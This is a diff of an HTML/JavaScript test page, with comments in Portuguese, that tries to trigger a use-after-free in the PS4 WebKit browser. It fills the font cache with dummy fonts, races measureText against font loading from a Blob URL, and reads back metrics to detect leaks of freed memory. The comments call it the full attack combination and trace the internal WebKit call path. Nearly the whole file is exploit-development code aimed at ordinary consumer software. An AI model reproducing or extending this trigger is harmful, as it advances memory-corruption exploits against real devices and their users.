@@ -1,78 +1,358 @@
 <!DOCTYPE html>
-<html><body>
-<button id="run">Run Test</button>
-<pre id="log"></pre>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<title>PS4 WebKit UAF — Race Final + Stress</title>
+<style>
+body{font-family:monospace;background:#0a0a0a;color:#ccc;padding:14px;margin:0;font-size:11px;}
+h1{color:#fff;font-size:13px;margin:0 0 4px;}
+p{color:#777;font-size:11px;margin:2px 0 6px;line-height:1.4;}
+.btn{display:inline-block;padding:6px 14px;border:none;border-radius:3px;
+     font-size:11px;cursor:pointer;margin:2px 1px;font-family:monospace;}
+.run{background:#1a5;color:#fff} .danger{background:#a21;color:#fff}
+.diag{background:#235;color:#9cf} .inf{background:#333;color:#aaa}
+#log{white-space:pre-wrap;font-size:11px;background:#000;padding:10px;
+     border:1px solid #222;max-height:580px;overflow-y:auto;
+     margin-top:8px;border-radius:3px;line-height:1.6;}
+.ok{color:#3f3}.wa{color:#fa3}.er{color:#f44}
+.hd{color:#8af;font-weight:bold}.dm{color:#444}
+</style>
+</head>
+<body>
+<h1>PS4 WebKit UAF — Race Final (nomes únicos + stress 10k)</h1>
+<p>
+  Verifica se <code>fba=8</code> em B2 era race genuíno ou reuso de família.<br>
+  Stress com 10.000 chamadas de measureText durante janela de carregamento.
+</p>
+<div>
+  <button class="btn diag"   onclick="runC0()">C0 — Verificar race genuíno (nomes únicos)</button>
+  <button class="btn danger" onclick="runC1()">C1 — Stress 10k measureText durante loading</button>
+  <button class="btn danger" onclick="runC2()">C2 — UAF real: nomes únicos + 100 dummies + race</button>
+  <button class="btn run"    onclick="runAll()">▶ Todos</button>
+  <button class="btn inf"    onclick="clearLog()">Limpar</button>
+</div>
+<div id="log"></div>
+
 <script>
-const log = s => document.getElementById('log').textContent += s + '\n';
+const L=document.getElementById('log');
+function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';L.appendChild(s);L.scrollTop=L.scrollHeight;}
+function sep(){log('─'.repeat(60),'dm');}
+function hdr(t){sep();log('  '+t,'hd');sep();}
+function ok(t){log('  ✓ '+t,'ok');}
+function warn(t){log('  ⚠ '+t,'wa');}
+function err(t){log('  ✗ '+t,'er');}
+function info(t){log('  · '+t);}
+function clearLog(){L.textContent='';}
 
-function runTest() {
-    log('--- Test A: measureText path (original UAF site) ---');
+const AHEM = 'resources/Ahem.woff';
+const AHEM_LOADED_FBA = 8;   // fba a 10px quando Ahem carregado
+const INTERSTITIAL_FBA = 11; // fba a 10px da fonte interstitial
 
-    // PS4 prune threshold is 50, so 100 unique families is enough
-    const dummies = [];
-    for (let i = 0; i < 100; i++) {
-        const c = document.createElement('canvas');
-        c.width = 1; c.height = 1;
-        const ctx = c.getContext('2d');
-        ctx.font = '10px "dummy' + i + '"';
-        dummies.push(c, ctx);
-    }
+let _blobURL = null;
 
-    // Try sub-1MB so opportunisticallyStartFontDataURLLoading fires eagerly
-    const fontURL_small = 'url("data:font/ttf;base64,' + 'A'.repeat(500000) + '")';
-    // Also keep the >1MB version as fallback
-    const fontURL_large = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
-
-    const keepAlive = [];
-    for (let url of [fontURL_small, fontURL_large]) {
-        for (let attempt = 0; attempt < 4; attempt++) {
-            const metricsDonor = new FontFace('mDonor_' + attempt + '_' + url.length, url);
-            const measured = new FontFace('mTarget_' + attempt + '_' + url.length, url,
-                { unicodeRange: 'U+13A0-13FF' });
-            document.fonts.add(metricsDonor);
-            document.fonts.add(measured);
-
-            const c = document.createElement('canvas');
-            c.width = 64; c.height = 64;
-            const ctx = c.getContext('2d');
-            ctx.font = '10px mDonor_' + attempt + '_' + url.length +
-                       ', mTarget_' + attempt + '_' + url.length;
-            keepAlive.push(metricsDonor, measured, c, ctx);
-
-            // measureText path (Site 1)
-            const tm = ctx.measureText('\u13A0\u13A2\u13A4');
-            void tm.fontBoundingBoxAscent;
-            void tm.fontBoundingBoxDescent;
-            void tm.emHeightAscent;
-            void tm.emHeightDescent;
-            void tm.hangingBaseline;
-            void tm.ideographicBaseline;
-        }
-    }
-    log('measureText path done (no crash = bug not triggered via this path)');
-
-    log('--- Test B: fillText path (Site 2 � drawTextUnchecked) ---');
-    const keepAlive2 = [];
-    const fontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(500000) + '")';
-    for (let attempt = 0; attempt < 4; attempt++) {
-        const f1 = new FontFace('fDonor' + attempt, fontURL);
-        const f2 = new FontFace('fTarget' + attempt, fontURL, { unicodeRange: 'U+13A0-13FF' });
-        document.fonts.add(f1);
-        document.fonts.add(f2);
-        const c = document.createElement('canvas');
-        c.width = 64; c.height = 64;
-        const ctx = c.getContext('2d');
-        ctx.font = '10px fDonor' + attempt + ', fTarget' + attempt;
-        keepAlive2.push(f1, f2, c, ctx);
-
-        // fillText path (Site 2 � drawTextUnchecked UAF)
-        ctx.fillText('\u13A0\u13A2\u13A4', 10, 10);
-    }
-    log('fillText path done (no crash = bug not triggered via this path)');
-    log('All paths complete � if you reached here without a crash, the synchronous');
-    log('font invalidation during width() is not firing on this PS4 browser build.');
+async function getBlobURL() {
+  if(_blobURL) return _blobURL;
+  const resp = await fetch(AHEM);
+  _blobURL = URL.createObjectURL(await resp.blob());
+  return _blobURL;
 }
 
-document.getElementById('run').addEventListener('click', runTest);
+function buildDummies(n) {
+  const a=[];
+  for(let i=0;i<n;i++){
+    const c=document.createElement('canvas');c.width=1;c.height=1;
+    const x=c.getContext('2d');
+    x.font='10px "d_'+i+'_'+Math.random().toString(36).slice(2)+'"';
+    a.push(c,x);
+  }
+  return a;
+}
+
+/* ═══════════════════════════════════════════════════════════
+   C0 — Verificar se fba=8 em B2 era race genuíno
+
+   HIPÓTESE: B2 segundo run mostrou fba=8 porque os nomes
+   b2donor_0..7 do PRIMEIRO run já estavam em document.fonts
+   como loaded → segundo run reutilizou as métricas carregadas.
+
+   VERIFICAÇÃO: usar nomes 100% únicos (timestamp + random)
+   garantindo que NUNCA houve um font com esse nome antes.
+
+   Se fba=8 aparecer → font carregou durante measureText → race real!
+   Se fba=11 aparecer → era reuso de família → confirma async loading.
+   ═══════════════════════════════════════════════════════════ */
+async function runC0() {
+  hdr('C0 — Race genuíno? Nomes únicos por execução');
+  info('Se fba=8 → race durante measureText (font carregou em C++)');
+  info('Se fba=11 → sempre interstitial → carregamento 100% async');
+
+  const blobURL = await getBlobURL();
+  const dummies = buildDummies(100);
+  const results = [];
+  const keepAlive = [];
+  const ts = Date.now();
+
+  for(let i = 0; i < 12; i++) {
+    // Nome COMPLETAMENTE ÚNICO — nunca existiu antes
+    const uid = 'c0_' + ts + '_' + i + '_' + Math.random().toString(36).slice(2);
+    const donor  = new FontFace(uid + '_donor', 'url("' + blobURL + '")');
+    const target = new FontFace(uid + '_target', 'url("' + blobURL + '")',
+      {unicodeRange:'U+13A0-13FF'});
+
+    document.fonts.add(donor);
+    document.fonts.add(target);
+    // Nomes nunca vistos antes → font começa em unloaded
+    const statusBefore = donor.status; // deve ser 'unloaded'
+
+    // Iniciar carregamento
+    donor.load().catch(()=>{});
+    target.load().catch(()=>{});
+    const statusAfterLoad = donor.status; // deve ser 'loading'
+
+    // Canvas com esses nomes únicos
+    const c   = document.createElement('canvas');
+    c.width   = 64; c.height = 64;
+    const ctx = c.getContext('2d');
+    ctx.font  = '10px ' + uid + '_donor, ' + uid + '_target';
+    keepAlive.push(donor, target, c, ctx, ...dummies);
+
+    // measureText IMEDIATO
+    const tm  = ctx.measureText('\u13A0\u13A2\u13A4');
+    const fba = tm.fontBoundingBoxAscent;
+    results.push(fba);
+
+    info('i='+i+' before='+statusBefore+' afterLoad='+statusAfterLoad+
+         ' fba='+fba+' donor='+donor.status);
+
+    if(fba === AHEM_LOADED_FBA) {
+      warn('  fba='+AHEM_LOADED_FBA+' → Ahem carregou! Race possível!');
+    } else if(fba === INTERSTITIAL_FBA) {
+      info('  fba='+INTERSTITIAL_FBA+' → interstitial (esperado)');
+    } else {
+      warn('  fba='+fba+' → VALOR INESPERADO → possível UAF!');
+    }
+  }
+
+  const unique = [...new Set(results)];
+  if(unique.includes(AHEM_LOADED_FBA) && unique.includes(INTERSTITIAL_FBA)) {
+    warn('TRANSIÇÃO DETECTADA: alguns 11, alguns 8 → race intermitente!');
+    warn('→ Font carregou durante measureText em alguns casos!');
+  } else if(unique.every(v => v === INTERSTITIAL_FBA)) {
+    ok('Todos fba=11 → carregamento 100% async (B2 era reuso de família)');
+  } else if(unique.every(v => v === AHEM_LOADED_FBA)) {
+    warn('Todos fba=8 → Blob URL carrega sincronamente! Testar C2!');
+  } else {
+    warn('Valores únicos: '+unique.join(', ')+' → comportamento variável');
+  }
+}
+
+/* ═══════════════════════════════════════════════════════════
+   C1 — Stress: 10.000 measureText durante janela de loading
+
+   Estratégia de máxima cobertura temporal:
+   1. Criar font com nome único + Blob URL
+   2. f.load() → status=loading
+   3. Medir `performance.now()` antes e depois de cada measureText
+   4. Chamar measureText 10.000 vezes em loop apertado
+   5. Registrar QUALQUER fba diferente de 11 (indica race)
+   6. Registrar quando o status muda para 'loaded'
+
+   Se a fonte carregar em qualquer ponto durante as 10k chamadas:
+   → fba deve mudar de 11 para 8 no momento exato
+   → Se fba=8 e status ainda='loading' → race durante measureText!
+   ═══════════════════════════════════════════════════════════ */
+async function runC1() {
+  hdr('C1 — Stress: 10.000 measureText durante janela de loading');
+  info('Procurando o momento EXATO da transição 11→8');
+
+  const blobURL = await getBlobURL();
+  const dummies = buildDummies(100);
+  const ts = Date.now();
+  const uid = 'c1_' + ts + '_' + Math.random().toString(36).slice(2);
+
+  const donor  = new FontFace(uid + '_donor',  'url("' + blobURL + '")');
+  const target = new FontFace(uid + '_target', 'url("' + blobURL + '")',
+    {unicodeRange:'U+13A0-13FF'});
+  document.fonts.add(donor);
+  document.fonts.add(target);
+  donor.load().catch(()=>{});
+  target.load().catch(()=>{});
+
+  const c   = document.createElement('canvas');
+  c.width   = 64; c.height = 64;
+  const ctx = c.getContext('2d');
+  ctx.font  = '10px ' + uid + '_donor, ' + uid + '_target';
+
+  const keepAlive = [donor, target, c, ctx, ...dummies];
+
+  let transition = -1;
+  let prev = -1;
+  let callsDone = 0;
+  const startTime = performance.now();
+  let transitionTime = -1;
+
+  for(let i = 0; i < 10000; i++) {
+    const tm  = ctx.measureText('\u13A0\u13A2\u13A4');
+    const fba = tm.fontBoundingBoxAscent;
+    callsDone++;
+
+    if(prev !== fba && prev !== -1) {
+      // TRANSIÇÃO DETECTADA!
+      transition = i;
+      transitionTime = performance.now() - startTime;
+      warn('TRANSIÇÃO em i='+i+' ('+transitionTime.toFixed(2)+'ms): '+prev+' → '+fba);
+      warn('donor.status='+donor.status+' target.status='+target.status);
+      if(fba !== AHEM_LOADED_FBA && fba !== INTERSTITIAL_FBA) {
+        err('VALOR ANÔMALO: fba='+fba+' → possível leitura de memória UAF!');
+      }
+    }
+    prev = fba;
+
+    // A cada 1000 chamadas, registrar estado
+    if(i % 1000 === 999) {
+      const elapsed = performance.now() - startTime;
+      info('  '+callsDone+' calls, '+elapsed.toFixed(1)+'ms, fba='+fba+
+           ', donor='+donor.status);
+    }
+  }
+
+  const totalTime = performance.now() - startTime;
+  info('Total: '+callsDone+' calls em '+totalTime.toFixed(1)+'ms');
+
+  if(transition >= 0) {
+    warn('Transição detectada na call #'+transition+' ('+transitionTime.toFixed(2)+'ms)');
+    if(prev === AHEM_LOADED_FBA) {
+      ok('Transição 11→8: fonte carregou durante o stress test!');
+      ok('→ Confirmar com C2 (com dummies para pressionar o cache)');
+    }
+  } else {
+    info('Sem transição detectada nas '+callsDone+' chamadas');
+    info('Último fba='+prev+' donor='+donor.status);
+    if(prev === INTERSTITIAL_FBA) {
+      warn('fba=11 após 10k calls → fonte não carregou');
+      warn('→ Carregamento async ocorreu DEPOIS das 10k calls');
+    } else if(prev === AHEM_LOADED_FBA) {
+      ok('fba=8 → fonte carregou antes das primeiras calls');
+      ok('→ Blob URL é rápido o suficiente para C2!');
+    }
+  }
+
+  // Aguardar e checar se a fonte carregou depois
+  await new Promise(r => setTimeout(r, 500));
+  const c2  = document.createElement('canvas');
+  c2.width  = 64; c2.height = 64;
+  const ctx2 = c2.getContext('2d');
+  ctx2.font  = ctx.font;
+  const tm2  = ctx2.measureText('\u13A0\u13A2\u13A4');
+  info('Após 500ms: fba='+tm2.fontBoundingBoxAscent+' donor='+donor.status);
+}
+
+/* ═══════════════════════════════════════════════════════════
+   C2 — UAF real: nomes únicos + 100 dummies + race
+
+   Combinação completa do ataque:
+   - Nomes únicos (elimina reuso de família)
+   - 100 dummies (pressiona threshold de poda = 50)
+   - Blob URL (dados em memória → load mais rápido)
+   - measureText imediato após f.load()
+   - Leitura de TODAS as propriedades UAF
+
+   Se a fonte carregar durante o glyph walk E o prune
+   acontecer → crash ou valores corrompidos.
+
+   Roda 20 tentativas com nomes únicos para maximizar chance.
+   ═══════════════════════════════════════════════════════════ */
+async function runC2() {
+  hdr('C2 — UAF completo: nomes únicos + dummies + Blob URL race');
+  info('20 tentativas com nomes únicos — máxima cobertura da janela de timing');
+
+  const blobURL = await getBlobURL();
+  const dummies = buildDummies(100);
+  const keepAlive = [];
+  const results = [];
+  const ts = Date.now();
+
+  try {
+    for(let i = 0; i < 20; i++) {
+      // Nome único garantido — NUNCA existiu antes
+      const uid = 'c2_' + ts + '_' + i + '_' + Math.random().toString(36).slice(2);
+
+      const donor  = new FontFace(uid + '_d', 'url("' + blobURL + '")');
+      const target = new FontFace(uid + '_t', 'url("' + blobURL + '")',
+        {unicodeRange:'U+13A0-13FF'});
+
+      document.fonts.add(donor);
+      document.fonts.add(target);
+
+      // Iniciar load → pump(Allow) → se Blob carregar síncronamente:
+      //   fontLoaded → fontLoadEventOccurred → dispatchInvalidationCallbacks
+      //   → fontsNeedUpdate → retrieveOrAddCachedFonts → pruneUnreferencedEntries
+      donor.load().catch(()=>{});
+      target.load().catch(()=>{});
+
+      const c   = document.createElement('canvas');
+      c.width   = 64; c.height = 64;
+      const ctx = c.getContext('2d');
+      ctx.font  = '10px ' + uid + '_d, ' + uid + '_t';
+      keepAlive.push(donor, target, c, ctx, ...dummies);
+
+      // measureText → measureTextInternal → fontMetrics antes de width()
+      // Se font carregou durante width() → UAF nas leituras abaixo
+      const tm = ctx.measureText('\u13A0\u13A2\u13A4');
+
+      const fba = tm.fontBoundingBoxAscent;
+      const fbd = tm.fontBoundingBoxDescent;
+      const ema = tm.emHeightAscent;
+      const emd = tm.emHeightDescent;
+      const hb  = tm.hangingBaseline;
+      const ib  = tm.ideographicBaseline;
+      results.push({fba, fbd, ema, emd, hb, ib, dSt: donor.status, tSt: target.status});
+
+      // Detectar valores anômalos (nem 11 nem 8) → UAF!
+      if(fba !== INTERSTITIAL_FBA && fba !== AHEM_LOADED_FBA) {
+        err('i='+i+' fba='+fba+' ANÔMALO → possível UAF! (esperado 11 ou 8)');
+        err('  fbd='+fbd+' ema='+ema+' emd='+emd+' hb='+hb+' ib='+ib);
+        err('  donor='+donor.status+' target='+target.status);
+      } else {
+        info('i='+i+' fba='+fba+' fbd='+fbd+' ema='+ema+
+             ' d='+donor.status+' t='+target.status);
+      }
+    }
+
+    // Análise
+    const fbaVals = results.map(r => r.fba);
+    const anomalous = fbaVals.filter(v => v !== INTERSTITIAL_FBA && v !== AHEM_LOADED_FBA);
+    const loaded    = fbaVals.filter(v => v === AHEM_LOADED_FBA);
+
+    if(anomalous.length > 0) {
+      err('VALORES ANÔMALOS DETECTADOS: '+anomalous.join(', '));
+      err('→ Leitura de memória após UAF confirmada!');
+    } else if(loaded.length > 0) {
+      warn(loaded.length + ' de 20 chamadas retornaram fba=8 (Ahem)');
+      warn('→ Blob URL carregou durante o glyph walk em ' +
+           loaded.length + ' tentativas');
+      warn('→ Se fontsNeedUpdate disparou durante width(): prune pode ter ocorrido');
+      warn('→ Nenhum crash = prune não liberou a entrada correta desta vez');
+    } else {
+      ok('Todos fba=11 → carregamento 100% async em nomes únicos');
+      ok('Conclusão: Blob URL também é async no PS4');
+    }
+
+  } catch(e) {
+    err('EXCEÇÃO em C2: '+e);
+  }
+}
+
+async function runAll() {
+  clearLog();
+  await runC0();
+  await runC1();
+  await runC2();
+  hdr('TODOS OS TESTES CONCLUÍDOS');
+  info('fba=11 consistente → carregamento 100% async no PS4');
+  info('fba=8 com nome único → Blob URL sincronamente disponível');
+  info('fba anômalo → UAF confirmado');
+}
 </script>
-</body></html>
+</body>
+</html>
